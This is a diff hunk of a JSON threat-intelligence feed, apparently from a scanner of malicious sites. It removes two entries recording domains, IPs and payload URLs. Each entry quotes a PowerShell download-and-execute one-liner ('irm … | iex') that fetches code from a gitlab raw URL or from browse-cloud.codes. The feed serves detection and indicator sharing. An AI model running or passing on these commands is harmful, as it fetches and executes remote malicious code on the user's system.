@@ -7387,47 +7387,5 @@
     ],
     "ReportId": "cmwkv9kms1g1g0omljms1lzaw",
     "ScannedAt": "2026-11-17T15:48:02.874000+00:00"
-  },
-  {
-    "UrlDomain": "csogrant.bt",
-    "DeliveryUrl": [],
-    "PayloadUrl": [],
-    "IP": [
-      "160.236.194.19"
-    ],
-    "Related": [
-      {
-        "Value": "gitlab.com",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "IRM gitlab[.]com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5 | IEX",
-    "ResolvedDownloadUrl": [
-      "https://gitlab.com/dsy648ajd6ff/01a1e287-8de7-700c-802a-969604d519c9/-/raw/main/01a1e287-8de7-700c-802a-9696051416d5"
-    ],
-    "ReportId": "cmwktvio01fxo0omlc5hd3w8p",
-    "ScannedAt": "2026-11-17T15:09:07.568000+00:00"
-  },
-  {
-    "UrlDomain": "frpdanismanlik.com",
-    "DeliveryUrl": [
-      "browse-cloud.codes"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "104.21.64.153"
-    ],
-    "Related": [
-      {
-        "Value": "https://browse-cloud.codes/f6f41b91b95bf127",
-        "Type": "payload download"
-      }
-    ],
-    "Payload": "irm 'browse-cloud.codes/f6f41b91b95bf127'|iex;",
-    "ResolvedDownloadUrl": [
-      "https://browse-cloud.codes/f6f41b91b95bf127"
-    ],
-    "ReportId": "cmwkte9y71fs10omlyn3mr6rc",
-    "ScannedAt": "2026-11-17T14:55:43.108000+00:00"
   }
 ]
